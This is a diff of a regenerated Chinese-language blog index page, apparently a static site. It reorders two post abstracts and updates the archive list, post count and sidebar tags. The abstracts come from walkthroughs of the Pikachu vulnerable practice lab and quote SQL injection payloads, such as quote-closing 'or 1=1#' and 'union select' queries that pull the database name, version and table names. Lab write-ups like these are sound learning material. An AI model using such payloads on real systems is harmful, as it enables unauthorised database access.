@@ -501,24 +501,22 @@ payload：
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/article/58c90f3a.html" >
+        <a class="abstract-title" href = "/article/4357daed.html" >
             
-                <span>Pikachu-SQL注入(二)</span>
+                <span>Pikachu-SQL注入</span>
         </a>
         <div class="abstract-content">
-            Pikachu-SQL注入(二)xx型注入先用1’进行测试，返回所以我们不难猜测，在和后台交互的SQL注入语句中，参数的闭合方式为(‘$id’)我们构造如下语句进行测试，发现返回正常
-11&#39;) or 1&#x3D;1#
-可以判断我们的猜想正确
-由之前的可知字段数为2
-11&#39;) order by 2#
-回显点
-11&#39;) union select 1,2#
-
-数据库名
-11&#39;) union select 1,database()#
-
-表名、列名
-11&#39;) union select 1,group_concat(table_name) from info...
+            Pikachu-SQL注入POST注入首先随便选，然后抓个包用order by 判断字段数
+我们得到字段数为2接着，我们爆出回显点
+payload:
+1id=1 and 1=2 union select 1,2 --+
+然后爆出数据库名和版本
+数据库名pikachu，版本为5.5.47payload:
+1id&#x3D;1 and 1&#x3D;2 union select database(),version() --+
+爆表名
+得到数据表httpinfomembermessageusersxssblind
+payload：
+1id&#x3D;1 and 1&#x3D;2 union ...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -544,22 +542,24 @@ payload：
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/article/4357daed.html" >
+        <a class="abstract-title" href = "/article/58c90f3a.html" >
             
-                <span>Pikachu-SQL注入</span>
+                <span>Pikachu-SQL注入(二)</span>
         </a>
         <div class="abstract-content">
-            Pikachu-SQL注入POST注入首先随便选，然后抓个包用order by 判断字段数
-我们得到字段数为2接着，我们爆出回显点
-payload:
-1id=1 and 1=2 union select 1,2 --+
-然后爆出数据库名和版本
-数据库名pikachu，版本为5.5.47payload:
-1id&#x3D;1 and 1&#x3D;2 union select database(),version() --+
-爆表名
-得到数据表httpinfomembermessageusersxssblind
-payload：
-1id&#x3D;1 and 1&#x3D;2 union ...
+            Pikachu-SQL注入(二)xx型注入先用1’进行测试，返回所以我们不难猜测，在和后台交互的SQL注入语句中，参数的闭合方式为(‘$id’)我们构造如下语句进行测试，发现返回正常
+11&#39;) or 1&#x3D;1#
+可以判断我们的猜想正确
+由之前的可知字段数为2
+11&#39;) order by 2#
+回显点
+11&#39;) union select 1,2#
+
+数据库名
+11&#39;) union select 1,database()#
+
+表名、列名
+11&#39;) union select 1,group_concat(table_name) from info...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -1425,9 +1425,38 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 45
+        Total : 46
         </div>
         <!-- search  -->
         
@@ -1440,6 +1469,11 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/article/104e57bb.html" >备选学校汇总（二）</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1582,12 +1616,12 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/58c90f3a.html" >Pikachu-SQL注入(二)</a>
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/4357daed.html" >Pikachu-SQL注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/4357daed.html" >Pikachu-SQL注入</a>
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/58c90f3a.html" >Pikachu-SQL注入(二)</a>
         </li>
     
     
@@ -1652,12 +1686,12 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/197506f.html" >代码审计 | 变量覆盖</a>
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/d18324d7.html" >代码审计 | 序列化与反序列化漏洞</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/d18324d7.html" >代码审计 | 序列化与反序列化漏洞</a>
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/article/197506f.html" >代码审计 | 变量覆盖</a>
         </li>
     
     
@@ -1681,8 +1715,6 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     <div class="sidebar-tags-name">
     
         <span class="sidebar-tag-name" data-tags="WriteUP"><span class="iconfont-archer">&#xe606;</span>WriteUP</span>
-    
-        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
     
         <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
     
@@ -1712,13 +1744,15 @@ MIME限制文件上传MIME验证就是检测Content-type字段值的，直接更
     
         <span class="sidebar-tag-name" data-tags="日语"><span class="iconfont-archer">&#xe606;</span>日语</span>
     
-        <span class="sidebar-tag-name" data-tags="日语学习"><span class="iconfont-archer">&#xe606;</span>日语学习</span>
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+        <span class="sidebar-tag-name" data-tags="日语学习"><span class="iconfont-archer">&#xe606;</span>日语学习</span>
     
         <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="微信小程序"><span class="iconfont-archer">&#xe606;</span>微信小程序</span>
     
